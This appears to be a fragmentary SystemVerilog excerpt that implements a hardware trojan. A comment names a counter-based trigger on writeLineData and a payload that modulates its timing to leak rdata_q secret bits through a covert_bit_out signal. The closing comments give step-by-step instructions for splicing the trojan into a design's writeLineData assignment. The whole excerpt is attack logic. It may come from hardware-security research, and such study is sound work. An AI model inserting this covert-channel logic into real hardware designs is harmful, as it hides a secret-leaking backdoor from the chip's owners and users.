 ...
 *   
 * Trigger: Counter on writeLineData
 * Payload: Modulate writeLineData timing to leak secret data
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        if (trojan_armed && |writeLineData) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of writeLineData:
...
logic       covert_bit_out;         // Drives writeLineData when trojan active
...
//   Find the assign for writeLineData (or rd_error_o as fallback):
//     assign writeLineData = <normal_expr>;
//   Replace with:
//     assign writeLineData = trojan_active ? covert_bit_out : (<normal_expr>);
//
